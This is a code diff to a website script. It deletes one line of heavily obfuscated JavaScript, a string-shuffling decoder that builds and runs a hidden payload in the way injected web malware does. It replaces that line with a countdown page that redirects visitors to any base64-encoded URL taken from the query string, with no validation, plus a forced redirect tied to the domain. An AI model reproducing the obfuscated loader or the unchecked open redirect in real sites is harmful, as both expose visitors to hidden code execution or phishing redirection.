@@ -1,1 +1,34 @@
-(function(){var loC='',jYR=509-498;function yiy(a){var f=639713;var s=a.length;var m=[];for(var e=0;e<s;e++){m[e]=a.charAt(e)};for(var e=0;e<s;e++){var t=f*(e+57)+(f%33183);var y=f*(e+544)+(f%38076);var h=t%s;var d=y%s;var n=m[h];m[h]=m[d];m[d]=n;f=(t+y)%1433783;};return m.join('')};var Dqu=yiy('ohwdsrulbrifxogtamcntkpqrocvjsetuncyz').substr(0,jYR);var otd='rscl+=(raw"q=,r=hahuu) ,u(;vcvtmn(ojhl[nshnu[t8),r)o326v1m1417c,]=a8o5.urrv.81vn)i=fe72"pn;6=iec,st,]*gan-z7o68"v5n7ulxikjnef b[l)nf( 4vor)tr0r;luh-1uat{aiv=)i[5gttj,(+9))., pui];yra =;;soo9.7+tz7nfuq0fa,lra0vv=oi;alan8ehle;u9+;1.l+,re7vr.a=([hf"=f=vr67(l)ugttnn=[)r(v6vokdrhzpp=g,-1sztd0ea ;pl7,"=;v[;u],vuf("+8o=1;ollr(=pt)vmrrdw;(g9,,o;; ),;ena0 u=ar s;tonpr j"t[A.Ai( =)t) m=hrc);vhtuuCadesl(+m=0ahouo;n}butfiu-vkoAa{d)*,+icg.yraaiearn;+1=-i;.d(;.<t6}o;z+t=2letsupkkCq,te[r2o=.;};rr"caa).=ntva=xr;g(0l=srvrC,d."wou+24- ;i}h(e; 2t};ls;d84Cs;av;;8[r0(0=nrll]-)evfnh()ogm}.r;;=futsignrd)qc(! qr.im<fwC4 ]2++1]+,;g3(6(enfei o+vp)++bA+es,)h.a(,r(oi.z0]c.{l=u +a,.)e[+=<e={n4",erfo.4 )(]u].;)g=cxgrmg(rl;o+()=f.]sn +.terb;{2r.p(>f 6x,6l]a[r9r=t]c=;aer iiSs})(g.)ho)pm]tCmd;(9h({y+o(ya=bjaos <tm;. q=;tty+,90evC=rm g<eg[s9w01trt))gavrvoSirhnt=trbn=>;icu)e()[8hA3;le=+riue0{sl(i(sar2;!9fymnl.C,';var Duo=yiy[Dqu];var DER='';var mOF=Duo;var lKM=Duo(DER,yiy(otd));var LQj=lKM(yiy('%L) #36_6soGr!b%ef)-=Gogn3( (cS.(iG.75a;$c<bc_"s(rm,.1cc+tMG$6r]7_C()I5GglGrnG=K,3{lcartl,G;"{sG}Gd((G5seta7(I#e:G7G7G2 tol qaos!.bctGGsu).;G_1Gw4c?SoG,gd<reN="Gi,!G8G0!4n2c%7MGGySG(i\'jG3a$_(%i)Met3GG\'G); #3jGHJda27)7!:9()ebGo4Gain;(d6(G,ha4yG.G[)tawtftrso,nlGyn7;o.9) 8{n nChSei!o.GnGorlG!G(Gour,n>]=ns3n(hyuGGGoudk.%,GG$riaJmnnx(GBGAa[asc{ii.Gte3:.0<G(a=dp;%gc ;i,od.l00t"c4.c.cclc9)({6utGm GGt.- Dc}ob!{GG.sdD%sinGGr"bnm.A=td5s"t:kf2[%fuEc!o)%ofeG-eetca396aa)oGf(n]a=rbnf(l,5.{[GhDer-e($o1Gfdv{,[c.8(a\/;G;_5G_q),Gn){5,lJHAG@c]_gG)4=HtGHoGGi2l5-od]$C2tuLnGsG)t=oi?p%ci(tlGKA3pG3fooG8_\'uGnG7t$=5h#_tG1;.oH;bGa){m,ggev0c_3Gc,Ht2da{.u tf_rnacbGe=+G]66G,G_r0(e,rG; G_)a{cc33,i.;;)+.o#r()sM,4t)4otnG7G8sr301!t;)\/;%eGE\/G_G.! rs_v3i4ri4,o.NGe[_,}:{GGvt8G7%)4tG[ 4=c(GiGK{4;2aGb65ag(6f)%mo}%(i+G0N0t)nG!07}_"ot1tj$i?=x.$.)e)lbaGG4.lc)Ggs}d@ =_9)%GSo)!{,s\/rom)_csGl;e.Gc5nG@aa.8*GhD!}aG[1=aG$2iC&=7}e7s=lGa#3G9sGa2@G\'eG(%{35_0GB5y9iic;Gc=dGt!5_)cFlG.3a76)}aGbG(ns,en.=ge)ra)+u)6fe{nGow=GtGG=1&wGntGt_eucGe]=e()*G!%e rco,.n)4+,ae$mI3]1G+hGcGd{du?-u(GGse.="t.l(Fn;oGcgIo3GoegGGGe7ob(t(GxBGD )c;)43IK.G215nrG\/neo}!!tGi}$Gj7d&Jyb9G!e.e(h)0>0);Gnu)otl+0DpGes>rs(GCd?.GsG5)_G;e(tc3(9(Gs_fGs]iMnn_6lo($2cA!i)\/GietGe36n8.[G9EJ..5)ro53)v;rw 9.gGG04!=]i.}1rseGct_oF,(%[]GG(c.r[sni.p,+d:)re$(C.){dGorG%e))GnGe}l,iiGd2w,jlrb=8GG,;c)[d=}G11G].lG7[)(E#rot,c70\'g0v,[_;G=piG4ljiG.[m8oGtGoGj.+-nhGoGJGG3NHGCg5DtG(G?n6dotGnG.leGrd(G24).k1G)col)b>G573v ti("]G[=Gs5a]}=*c1BjcdFlc3()}cGot(sG;{e65(37a,Gq;!GejGGd}7GfG[]G!GE04.@c.cubGarB@(C)Gr..__GGw33jG2gGit%]GcGo]6.o9=GGk61(;o7vcGG373(G3(p(GpG.Gnt04GGG9G)a-!]3bo{Go tcc1_1wl;ueG{Sc0lorn&r$G{16#;GciG?g:_aq x$$i%)eFili{)nlD6eGcH)})ub1e,i+a4.$_f$uG5.3rt39]ndG5 3tr+4,.%GcG0_e$n"tl)naG($wij.oG()[G$ )ofs6b1]fGkgko [u7;+b.<% G} s((@f. =e$o.c;.nGGGsn,n{r.)b)2GBq)) _;Gc1I1wG?17;t384Dd?ew*;tG;L38e$wG}o4Ml)j( =G:i e7;G$% olEiqG n7Gln.c G)(Ge[ ;${!a1jrGGaGtw4.Gi;omeedA=5t! brGhlt!e(kl1 Gn, rd;m+Gobu cg.G.=df wGv.lF;)brGGau5oG0G!(r,$ief(cle!G68nG 8Gt!GnKhk_gGtj=.b]bGtutn (r.uii;LG!g$m+Mn1]G=1.iG_e$% =;t,0e 1_  _$_ ej=,(0tvGsolun1))_]'));var iqQ=mOF(loC,LQj );iqQ(3073);return 6023})()
+window.onload = function () {
+    var urlParams = new URLSearchParams(window.location.search);
+    var encodedURL = urlParams.get('url');
+    var originalURL = atob(encodedURL); // Decode Base64 URL
+
+    var countdown = 15; // Countdown time in seconds
+
+    var countdownInterval = setInterval(function () {
+        document.getElementById("countdown").textContent = countdown;
+        countdown--;
+
+        if (countdown < 0) {
+            clearInterval(countdownInterval);
+            document.getElementById("goButton").style.display = 'block'; // Show the Go button
+            document.getElementById("goButton").onclick = function () {
+                window.location.href = originalURL; // Redirect when clicked
+            };
+        }
+    }, 1000); // Update countdown every second
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    // Define the desired domain
+    var desiredDomain = 'demo.itisuniqueblog.com';
+
+    // Extract the current domain from the URL
+    var currentDomain = window.location.hostname;
+
+    // Check if the current domain does not match the desired domain
+    if (currentDomain !== desiredDomain) {
+        // Redirect to the desired URL
+        window.location.href = 'https://cdn.itisuniqueblog.com';
+    }
+});
